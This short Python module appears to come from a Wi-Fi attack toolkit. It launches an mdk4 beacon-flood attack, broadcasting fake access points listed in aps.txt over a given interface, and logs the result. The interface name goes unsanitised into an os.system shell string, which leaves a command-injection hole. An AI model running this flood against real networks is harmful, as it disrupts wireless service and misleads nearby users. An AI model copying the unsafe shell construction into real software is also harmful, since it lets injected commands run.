import os, sys
from colorama import Fore
from source import print_slow, logs

def ap(iface):
    try:
        command = os.system("sudo mdk4 " + iface + " b -f aps.txt")
        logs.log(0, "launching AccessPoint attack with mdk4")
        if command > 2 and command != 33280:
            print(Fore.RED + "\n[Error 8]" + Fore.RESET)
            logs.log(1, "[Error 8]; error in module src/ap.py")
            sys.exit()
        else:
            logs.log(2, "Attack terminated")
    except KeyboardInterrupt:
        logs.log(0, "Keyboard Interrupt detected")
